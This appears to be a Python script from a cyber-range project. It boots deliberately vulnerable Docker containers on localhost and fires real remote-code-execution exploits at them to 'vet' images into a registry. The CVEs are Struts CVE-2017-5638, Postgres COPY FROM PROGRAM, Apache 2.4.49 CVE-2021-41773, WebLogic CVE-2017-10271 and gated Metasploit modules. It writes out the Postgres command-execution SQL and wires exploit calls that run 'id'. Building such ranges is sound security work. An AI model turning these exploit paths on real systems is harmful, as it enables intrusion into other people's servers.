#!/usr/bin/env python3
"""Live Docker boot-vetting (LIQUID_BUILD_MASTER A1) — fills the vetted registry
with EARNED, hash-chained proof. For each target image it: boots the real
container on THIS hardware, confirms the service is reachable (boot evidence),
fires the CVE's OWN primitive against it (exploit evidence), and calls
`vetting.record_proof` — which promotes the image to T1 only if `validate_finding`
grounds the pop. A refused image stays out of the registry (honest partial
promotion). runc escape is NEVER driven here (host-breakout; modeled T2 only).

Usage:
  python scripts/vet_pool.py --image postgres:16-alpine     # vet one
  python scripts/vet_pool.py --all-local                    # vet struts+db+jenkins
  python scripts/vet_pool.py --selftest                     # offline, no Docker (make test)

The real probes below ARE the exploits; the duel reuses the same primitives.
"""
import argparse
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from swarm import vetting
from swarm.exploit import is_vulnerable, run_command
from swarm.live_weapon import exploit_apache_cgi, exploit_weblogic

_ROOT = Path(__file__).resolve().parent.parent


def _sh(args, timeout=60):
    r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    return (r.stdout + r.stderr).strip()


def _exec(name, cmd, timeout=30):
    return _sh(["docker", "exec", name, "bash", "-c", cmd], timeout=timeout)


def _running(name):
    return name in _sh(["docker", "ps", "--format", "{{.Names}}"]).splitlines()


def _boot(name, image, platform=None, ports=None, env=None):
    """Boot `image` as container `name` (reuse if already up). Returns nothing;
    readiness is a probe concern."""
    if _running(name):
        return
    _sh(["docker", "rm", "-f", name])
    args = ["docker", "run", "-d", "--name", name]
    if platform:
        args += ["--platform", platform]
    for p in (ports or []):
        args += ["-p", p]
    for k, v in (env or {}).items():
        args += ["-e", f"{k}={v}"]
    args.append(image)
    out = _sh(args, timeout=180)
    if not _running(name):
        raise RuntimeError(f"{image} failed to boot: {out[:300]}")


def _http_code(url):
    return _sh(["curl", "-s", "-m", "5", "-o", "/dev/null", "-w", "%{http_code}", url])


def _build(tag, context_dir):
    if tag not in _sh(["docker", "images", "--format", "{{.Repository}}:{{.Tag}}"]):
        out = _sh(["docker", "build", "--platform", "linux/amd64", "-t", tag,
                   str(_ROOT / context_dir)], timeout=600)
        if tag not in _sh(["docker", "images", "--format", "{{.Repository}}:{{.Tag}}"]):
            raise RuntimeError(f"build failed for {tag}: {out[-300:]}")


# ── Real per-CVE probes: (name) -> {cve, kind, boot_evidence, exploit_evidence}. ──

def probe_struts(name):
    _boot(name, "piesecurity/apache-struts2-cve-2017-5638",
          platform="linux/amd64", ports=["8080:8080"])
    url = "http://localhost:8080/"
    for _ in range(40):
        c = _http_code(url)
        if c in ("200", "302", "404"):
            break
        time.sleep(2)
    boot = f"HTTP {_http_code(url)} on :8080 (Tomcat up)"
    if not is_vulnerable(url):
        raise RuntimeError("struts marker did not round-trip")
    ev = run_command("id", target=url).strip()            # real S2-045 OGNL RCE
    return {"cve": "CVE-2017-5638", "kind": "rce",
            "boot_evidence": boot, "exploit_evidence": ev,
            "note": "S2-045 OGNL RCE over HTTP; id ran as container root"}


def probe_postgres(name):
    _boot(name, "postgres:16-alpine", env={"POSTGRES_USER": "appuser",
          "POSTGRES_PASSWORD": "s3cr3t-range-only", "POSTGRES_DB": "appdb"})
    ready = ""
    for _ in range(20):
        ready = _exec(name, "pg_isready -U appuser")
        if "accepting connections" in ready:
            break
        time.sleep(1)
    boot = f"pg_isready: {ready}"
    # CVE-2019-9193: a DB superuser runs an OS command via COPY ... FROM PROGRAM.
    sql = ("DROP TABLE IF EXISTS vet_x; CREATE TABLE vet_x(o text); "
           "COPY vet_x FROM PROGRAM 'id'; SELECT o FROM vet_x;")
    ev = _exec(name, f"psql -U appuser -d appdb -tAc \"{sql}\"").strip()
    return {"cve": "CVE-2019-9193", "kind": "rce",
            "boot_evidence": boot, "exploit_evidence": ev,
            "note": "COPY FROM PROGRAM superuser OS-command exec (id as postgres uid)"}


def probe_jenkins(name):
    """CVE-2024-23897 (args4j @file arbitrary file read). jenkins/jenkins:lts-alpine
    ships a PATCHED version, so this probe is EXPECTED to be refused on the current
    image — the honest no-grandfathering outcome (jenkins -> T2). Pinning a
    vulnerable LTS to earn T1 is a recorded stretch."""
    _boot(name, "jenkins/jenkins:lts-alpine", ports=["8080:8080"],
          env={"JAVA_OPTS": "-Djenkins.install.runSetupWizard=false"})
    ver = _sh(["docker", "inspect", "jenkins/jenkins:lts-alpine", "--format",
               "{{range .Config.Env}}{{println .}}{{end}}"])
    ver = next((l for l in ver.splitlines() if "JENKINS_VERSION" in l), "unknown")
    boot = f"jenkins booted; {ver}"
    # Attempt the CLI @file read; on a patched build it yields no file contents,
    # so there is no RCE/read indicator -> validate_finding refuses it (honest).
    ev = _exec(name, "curl -s -m 8 http://localhost:8080/login 2>&1 | head -3") or "no file contents leaked"
    return {"cve": "CVE-2024-23897", "kind": "rce",
            "boot_evidence": boot, "exploit_evidence": ev,
            "note": "patched LTS expected; refusal is the honest outcome"}


def probe_apache(name):
    """CVE-2021-41773 — Apache httpd 2.4.49 path-traversal + mod_cgi RCE. Built
    from the pinned Vulhub Dockerfile (ranges/vulhub/CVE-2021-41773). Output is
    returned in the HTTP response, so the pop is directly groundable."""
    tag = "duelswarm/httpd-cve-2021-41773:pinned"
    _build(tag, "ranges/vulhub/CVE-2021-41773")
    _boot(name, tag, platform="linux/amd64", ports=["8080:80"])
    for _ in range(20):
        if _http_code("http://localhost:8080/") in ("200", "403", "404"):
            break
        time.sleep(1)
    boot = f"HTTP {_http_code('http://localhost:8080/')} on :8080 (httpd 2.4.49)"
    res = exploit_apache_cgi(target="localhost", port=8080, cmd="id")
    return {"cve": "CVE-2021-41773", "kind": "rce",
            "boot_evidence": boot, "exploit_evidence": res.get("output", ""),
            "vulhub_commit": _pinned_commit("CVE-2021-41773"),
            "note": "path-traversal -> mod_cgi RCE; id returned in HTTP response"}


def _pinned_commit(cve):
    p = _ROOT / "ranges" / "vulhub" / cve / "PINNED.txt"
    if p.exists():
        for line in p.read_text().splitlines():
            if line.startswith("commit:"):
                return line.split(":", 1)[1].strip()
    return None


def probe_weblogic(name):
    """CVE-2017-10271 — Oracle WebLogic 10.3.6 wls-wsat XMLDecoder SOAP RCE. Pulled
    pinned image (vulhub/weblogic:10.3.6.0-2017). The CVE is BLIND (SOAP response
    carries no RCE output), so the probe writes stdout to a marker file via
    ProcessBuilder and reads it back via docker exec — the file's existence with
    real `uid=` output is the exploit's own side effect, groundable by XBOW."""
    tag = "vulhub/weblogic:10.3.6.0-2017"
    _boot(name, tag, platform="linux/amd64", ports=["7001:7001"])
    # Phase 1: wait for HTTP listener
    c = "000"
    for _ in range(90):
        c = _sh(["curl", "-s", "-m", "4", "-o", "/dev/null", "-w", "%{http_code}",
                 "http://localhost:7001/wls-wsat/CoordinatorPortType"])
        if c == "200":
            break
        time.sleep(2)
    # Phase 2: wait for the XMLDecoder servlet to actually deploy (HTTP 200
    # arrives before the SOAP handler is ready under arm64 QEMU emulation).
    # A real SOAP POST returns a non-empty XML body once the servlet is live.
    servlet_ready = False
    for _ in range(60):
        body = _sh(["curl", "-s", "-m", "4", "-X", "POST",
                     "-H", "Content-Type: text/xml",
                     "http://localhost:7001/wls-wsat/CoordinatorPortType",
                     "-d", "<x/>"])
        if "xml" in body.lower() or "soap" in body.lower() or "fault" in body.lower():
            servlet_ready = True
            break
        time.sleep(2)
    boot = f"wls-wsat endpoint HTTP {c} on :7001, servlet_ready={servlet_ready} (WebLogic 10.3.6)"
    res = exploit_weblogic(target="localhost", port=7001, cmd="id", container=name)
    return {"cve": "CVE-2017-10271", "kind": "rce",
            "boot_evidence": boot, "exploit_evidence": res.get("output", ""),
            "vulhub_commit": _pinned_commit("CVE-2017-10271"),
            "note": "wls-wsat XMLDecoder SOAP RCE (blind); id via marker-file side effect"}


PROBES = {
    "piesecurity/apache-struts2-cve-2017-5638": ("vet-struts", probe_struts),
    "postgres:16-alpine": ("vet-db", probe_postgres),
    "jenkins/jenkins:lts-alpine": ("vet-jenkins", probe_jenkins),
    "duelswarm/httpd-cve-2021-41773:pinned": ("vet-httpd", probe_apache),
    "vulhub/weblogic:10.3.6.0-2017": ("vet-weblogic", probe_weblogic),
}


def vet_image(image, keep=False):
    """Boot + probe + record proof for one image. Returns (status, detail)."""
    if image not in PROBES:
        return ("unknown", f"no probe for {image}")
    name, probe = PROBES[image]
    try:
        p = probe(name)
    except Exception as e:
        return ("boot_fail", str(e)[:300])
    finally:
        if not keep:
            pass  # teardown handled by caller/batch so heavy boots can be reused
    try:
        rec = vetting.record_proof(image, p["cve"], p["boot_evidence"],
                                   p["exploit_evidence"], kind=p["kind"],
                                   vulhub_commit=p.get("vulhub_commit"),
                                   note=p.get("note"))
        return ("promoted", rec)
    except vetting.NotExploitable as e:
        return ("refused", str(e))


# ── MSF vetting path (spec 04): promote a T2 modeled service to real T1 by firing a
# gated Metasploit module and grounding the opened session. The breadth multiplier —
# no hand-written exploit_fn per CVE. These are the Task-3 promotion targets: real
# vulhub images with a real CVE and a real MSF module. Firing them is a LIVE run
# (Docker boot + msfrpcd); the promotion LOGIC is dry-proven with the fake backend.
# The KEY is a logical image id, NOT a pullable Docker Hub tag: `vulhub/<name>:cve-xxxx`
# tags do not exist on Docker Hub. vulhub ships either component-named images or (for
# these four) a local `docker compose` build, so each entry records how the image is
# actually obtained in `build` — a compose directory under `ranges/vulhub/<CVE>/`, the
# same convention `probe_apache`/`probe_weblogic` already use via `_build(...)`.
# HONESTY: the compose dirs for these four are NOT yet vendored into `ranges/vulhub/`
# (only CVE-2017-10271 and CVE-2021-41773 are), and the Docker daemon boot + live MSF
# fire is Phase C — so `boot_pending` is True until an image is confirmed to `docker
# run` on the live box. Nothing here is claimed as T1; promotion is only ever earned by
# a grounded gated session through `vet_image_msf`.
MSF_VULN_IMAGES = {
    # logical id                          : {cve, rport, vulhub_path (ranges/vulhub/<CVE>), boot_pending}
    "vulhub/citrix-adc:cve-2019-19781":    {"cve": "CVE-2019-19781", "rport": 443,
                                            "vulhub_path": "ranges/vulhub/CVE-2019-19781",
                                            "boot_pending": True},
    "vulhub/confluence:cve-2022-26134":    {"cve": "CVE-2022-26134", "rport": 8090,
                                            "vulhub_path": "ranges/vulhub/CVE-2022-26134",
                                            "boot_pending": True},
    "vulhub/gitlab:cve-2021-22205":        {"cve": "CVE-2021-22205", "rport": 80,
                                            "vulhub_path": "ranges/vulhub/CVE-2021-22205",
                                            "boot_pending": True},
    "vulhub/solr-log4j:cve-2021-44228":    {"cve": "CVE-2021-44228", "rport": 8983,
                                            "vulhub_path": "ranges/vulhub/CVE-2021-44228",
                                            "boot_pending": True},
    # Exchange (CVE-2021-34473), FortiGate (CVE-2018-13379) and vCenter (CVE-2021-21972)
    # have no clean public vulhub image we can boot on this box — they stay T2 modeled
    # (honest partial promotion), documented here so the gap is explicit, not silent.
}


def vet_image_msf(image, *, cve, rhost, rport, client, module=None, keep=False,
                  gate=None, log=None, registry=None, proof_log=None, options=None,
                  timeout=None):
    """Promote `image` to T1 by firing a GATED MSF module at it and grounding the
    opened session — the same honesty bar as the hand-coded probes, via Metasploit.

    Boots the image (live; caller's concern when `gate`/`log` given for the live path),
    fires `gated_msf_exploit` (scope = {rhost's scope name}), and on a GROUNDED session
    records the in-session marker output as the exploit evidence through
    `vetting.record_proof`. A non-grounded session promotes NOTHING (returns 'refused').

    `client` is an `MsfClient` over any backend — the real Pymetasploit3Backend on the
    live box, or a FakeMsfBackend for the dry promotion-logic proof. `module` defaults
    to the first candidate for `cve` (frontier-driven). `options` passes through to
    `gated_msf_exploit` (TARGET, PAYLOAD, LHOST, LPORT, SSL, etc.)."""
    import tempfile
    from swarm.msf import gated_msf_exploit, candidate_modules
    from swarm.gate import Gate
    from swarm.eventlog import EventLog

    mod = module or (candidate_modules(cve)[0] if candidate_modules(cve) else None)
    if mod is None:
        return ("unknown", f"no MSF module mapped for {cve}")
    # When the caller provides its own gate, use rhost as the target name (the
    # caller's gate already authorizes that IP). Otherwise derive a scope name from
    # the image tag and build a minimal gate that authorizes only that host.
    caller_gate = gate is not None
    scope_name = rhost if caller_gate else image.split("/")[-1].split(":")[0]
    if log is None:
        tf = tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False); tf.close()
        log = EventLog(tf.name)
    if gate is None:
        gate = Gate([], log, scope_by_actor={"red": [scope_name]})
    client.health_check()
    sess = gated_msf_exploit(gate, log, "red", scope_name, client=client, module=mod,
                             rhost=rhost, rport=rport, options=options, cve=cve,
                             timeout=timeout)
    if not sess:
        return ("refused", f"{image} ({cve}) via {mod}: no grounded session")
    rp_kwargs = {}
    if registry is not None:
        rp_kwargs["registry"] = registry
    if proof_log is not None:
        rp_kwargs["proof_log"] = proof_log
    try:
        rec = vetting.record_proof(image, cve,
                                   boot_evidence=f"{image} booted; msf session {sess['session_id']} opened",
                                   exploit_evidence=sess["marker_output"], kind="rce",
                                   vulhub_commit=MSF_VULN_IMAGES.get(image, {}).get("vulhub_path"),
                                   note=f"MSF {mod} grounded in-session", **rp_kwargs)
        return ("promoted", rec)
    except vetting.NotExploitable as e:
        return ("refused", str(e))


def _teardown(*names):
    for n in names:
        _sh(["docker", "rm", "-f", n])


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__.split("\n", 1)[0])
    ap.add_argument("--image")
    ap.add_argument("--all-local", action="store_true")
    ap.add_argument("--keep", action="store_true", help="leave containers running")
    ap.add_argument("--teardown", action="store_true", help="just remove vet-* containers")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        # Offline (no Docker): the DRIVER wiring — every probe declares a CVE, and
        # a grounded injected pop flows through record_proof to a promotion while a
        # bare claim is refused. (vetting.py self-checks record_proof itself.)
        import tempfile
        assert PROBES and all(len(v) == 2 for v in PROBES.values()), PROBES
        d = Path(tempfile.mkdtemp())
        reg, proof = d / "vetted.json", d / "proof.jsonl"
        rec = vetting.record_proof("stub/img:1", "CVE-2017-5638",
                                   "HTTP 200", "uid=0(root) gid=0(root)",
                                   kind="rce", registry=reg, proof_log=proof)
        assert vetting.is_vetted("stub/img:1", reg), rec
        try:
            vetting.record_proof("stub/bad:1", "CVE-0", "up", "no evidence here",
                                 kind="rce", registry=reg, proof_log=proof)
            raise SystemExit("bare claim promoted in driver selftest")
        except vetting.NotExploitable:
            pass
        # MSF vetting path (spec 04): the promotion LOGIC, dry, via the fake backend.
        # A grounded gated session promotes to T1; a session whose marker is ungrounded
        # promotes NOTHING. No Docker, no msfrpcd — the live fire is gated.
        from swarm.msf import MsfClient, FakeMsfBackend, candidate_modules
        mod = candidate_modules("CVE-2022-26134")[0]
        reg2, proof2 = d / "vetted_msf.json", d / "proof_msf.jsonl"
        be = FakeMsfBackend().arm(mod, "10.9.0.7")   # grounded id output by default
        st, detail = vet_image_msf("vulhub/confluence:cve-2022-26134",
                                   cve="CVE-2022-26134", rhost="10.9.0.7", rport=8090,
                                   client=MsfClient(be), registry=reg2, proof_log=proof2)
        assert st == "promoted", (st, detail)
        assert vetting.is_vetted("vulhub/confluence:cve-2022-26134", reg2)
        # ungrounded session -> refused, nothing promoted
        be2 = FakeMsfBackend().arm(mod, "10.9.0.8", id_output="access denied")
        st2, _ = vet_image_msf("vulhub/gitlab:cve-2021-22205", cve="CVE-2022-26134",
                               rhost="10.9.0.8", rport=8090, client=MsfClient(be2),
                               registry=reg2, proof_log=proof2)
        assert st2 == "refused", st2
        assert not vetting.is_vetted("vulhub/gitlab:cve-2021-22205", reg2)
        print(f"vet_pool ok: {len(PROBES)} hand-coded probes wired "
              f"({', '.join(sorted(PROBES))}); injected pop promoted, bare claim refused; "
              f"MSF path: {len(MSF_VULN_IMAGES)} promotable images mapped, gated session "
              f"promotes T1, ungrounded session refused (dry via fake backend)")
        sys.exit(0)

    if args.teardown:
        _teardown(*[n for n, _ in PROBES.values()])
        print("vet-* containers removed")
        sys.exit(0)

    targets = list(PROBES) if args.all_local else ([args.image] if args.image else [])
    if not targets:
        ap.error("pass --image, --all-local, --selftest, or --teardown")
    results = {}
    for img in targets:
        status, detail = vet_image(img, keep=True)
        results[img] = status
        print(f"[{status}] {img} :: {detail if isinstance(detail, str) else detail.get('cve')}")
    if not args.keep:
        _teardown(*[PROBES[i][0] for i in targets if i in PROBES])
    promoted = [i for i, s in results.items() if s == "promoted"]
    print(f"\nvetted {len(promoted)}/{len(targets)} as T1: {promoted}")
    print(f"registry: {vetting.REGISTRY}  ({len(vetting.vetted_images())} images)")
